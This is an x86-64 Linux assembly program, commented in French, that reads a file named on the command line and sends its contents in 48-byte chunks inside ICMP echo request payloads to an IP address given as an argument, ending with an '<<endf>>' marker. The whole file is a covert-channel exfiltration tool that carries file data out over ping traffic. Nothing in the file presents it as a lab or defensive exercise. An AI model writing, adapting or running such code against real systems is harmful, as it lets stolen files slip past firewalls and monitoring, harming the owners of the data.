global _start 

section .data
    mode_open dq 0644o
    flags_open dq 0o
    size_file_ping dq 0x30
    balise_debut dq '<<staf>>'
    balise_fin dq '<<endf>>'


address:
  dw 2
  dw 0
  db 0
  db 0
  db 0
  db 0
  dd 0 
  dd 0 

packet:
  dw      0x0008
  dw      0x0000; Checksum à 0
  dw      0x000a
  dw      0x0002
  dw      0xad18
  dw      0x8c67
  dw      0x0000
  dw      0x0000


data: 
  times 24 dw 0x0000


buffer: 
  times 1024 db 0ffh

good:
  db 'good'


section .bss
  tmp resb 64
  buffer_file resb 48 
  file_size resb 8
  file_descriptor resq 1
  recv_buffer resb 64


section .text

_start:

  pop rax 
  cmp rax, 3
  jne error

  pop rdi
  xor rdi, rdi

  ;parsing de l'ip
  pop rsi
  mov rdi, address + 4 
  call parse_ip

  ; création du socket
  mov rax, 41
  mov rdi, 2
  mov rsi, 3
  mov rdx, 1
  syscall

  mov r12, rax

  ; Mettre le socket en mode non-bloquant
  mov rax, 72          ; syscall pour fcntl
  mov rdi, r12
  mov rsi, 2
  syscall

  or eax, 0x800
  mov rsi, 4
  mov rdx, rax
  syscall
    
  pop rdi ; nom fichier arg
  call send_file     

  ;cmp word [buffer + 20], 0
  ;jne error

  mov rax, 1
  mov rdi, 1
  mov rsi, good
  mov rdx, 4
  syscall

  mov rax, 60
  mov rdi, 0
  syscall

error:

  mov rax, 60
  mov rdi, 1
  syscall



  ; ------------------------------------------
  ; ------------------------------------------
  ; fonctions !!!
icmp_checksum:
	; Paramètres d'entrée :
	; RAX : Adresse du buffer sur lequel appliquer le checksum (32 octets)


	push rbx
	push rcx
	push rdx

	xor rbx, rbx
	xor rcx, rcx
	xor rdx, rdx

	
	loop_addition:
		mov bx, word[rax + rcx]
		add rdx, rbx

		add rcx, 2

		cmp rcx, 63
		jle loop_addition


	mov rbx, rdx
	

	; Addition du 5ème nibble au 1er
	shr rbx, 16
	add rdx, rbx

	; NOT du checksum
	not rdx

	; On ne garde que les 2 derniers octets
  and rdx, 0xffff

	; Ecriture du checksum dans le paquet
	lea rcx, [rax + 2]
	mov [rcx], dx

	pop rdx
	pop rcx
	pop rbx

ret

send_file: 

  ;ouverture du fichier 
  mov rax, 2
  mov rsi, [flags_open]
  mov rdx, [mode_open]
  syscall

  ; verification des erreurs
  test rax, rax 
  js error

  ;fd dans une var
  mov [file_descriptor], rax
  ;========= taille du fichier =========

  ;taille du fichier
  mov rax,8
  mov rdi, [file_descriptor]
  mov rsi, 0
  mov rdx, 1
  syscall

  mov rbx, rax

  mov rax,8
  mov rdi,[file_descriptor]
  mov rsi, 0
  mov rdx, 2
  syscall

  mov [file_size], rax ;save

  ;reset du curseur
  mov rax, 8
  mov rdi, [file_descriptor]
  mov rsi,0
  mov rdx,0
  syscall

  ;========= lecture/envoi =========
  xor r15,r15

    read_loop:
      ;reset data to 0
      call reset_data

      ; Lecture du fichier et et opn met dans la var data 48b
      mov rax, 0
      mov rdi, [file_descriptor]
      mov rsi, data
      mov rdx, [size_file_ping]
      syscall

      ; Affichage du contenu du fichier, just epour debug 
      mov rax, 1
      mov rdi, 1
      mov rsi, data
      mov rdx, [size_file_ping]
      syscall


      mov rax, packet
      call icmp_checksum

    send_packet:
      mov rax, 44
      mov rdi, r12
      mov rsi, packet
      mov rdx, 64 ; valeur a modifier en focntion de la data ( mini 8)
      mov r10, 0
      mov r8, address
      mov r9, 16
      syscall     


    ;On vérifie si on reçoit une reponse
      mov rax, 45
      mov rdi, r12
      mov rsi, recv_buffer
      mov rdx, 64
      mov r10, 0
      mov r8, 0
      mov r9, 0
      syscall

      test rax, rax
      js send_packet


      add r15, 48
      cmp r15, [file_size]
      jge end_read_loop   
      jmp read_loop


    end_read_loop:

  ;flag de fin du programme
  ;

      call reset_data
     
      mov rax, [balise_fin]
      mov [data], rax

      mov rax, packet
      call icmp_checksum

      mov rax, 44
      mov rdi, r12
      mov rsi, packet
      mov rdx, 48 ; valeur a modifier en focntion de la data ( mini 8)
      mov r10, 0
      mov r8, address
      mov r9, 16
      syscall     




ret


ping_init: 
  ; arg rax taille du fichier

  mov rax, [balise_debut]
  mov [data], rax

  mov rax, packet
  call icmp_checksum

  mov rax, 44
  mov rdi, r12
  mov rsi, packet
  mov rdx, 32 ; valeur a modifier en focntion de la data ( mini 8)
  mov r10, 0
  mov r8, address
  mov r9, 16
  syscall     

ret


reset_data:
  loop_reset:
    ; On met RCX = nombre de mots à écrire : 24
    mov   rcx, 24
    lea   rdi, [rel data]
    xor   eax, eax

    rep   stosw

    xor rcx, rcx
    
  end_reset_loop:
  xor r8,r8
  xor r9,r9

  ;reset du checksum
	lea rcx, [packet + 2]
	mov word[rcx], 0x0000

  ; Reset recv_buffer
  lea   rdi, [recv_buffer]
  mov   rcx, 64
  xor   eax, eax
  rep   stosb
ret


parse_ip:
    xor rcx, rcx       
.next_octet:
    xor rax, rax      
.next_char:
    movzx rdx, byte [rsi]
    test dl, dl
    jz .finish
    inc rsi
    cmp dl, '.'
    je .store
    sub dl, '0'
    imul eax, 10
    add eax, edx
    jmp .next_char
.store:
    mov [rdi + rcx], al ; Stocker l'octet
    inc ecx
    cmp ecx, 4
    jb .next_octet
    ret
.finish:
    mov [rdi + rcx], al ; Dernier octet
    ret
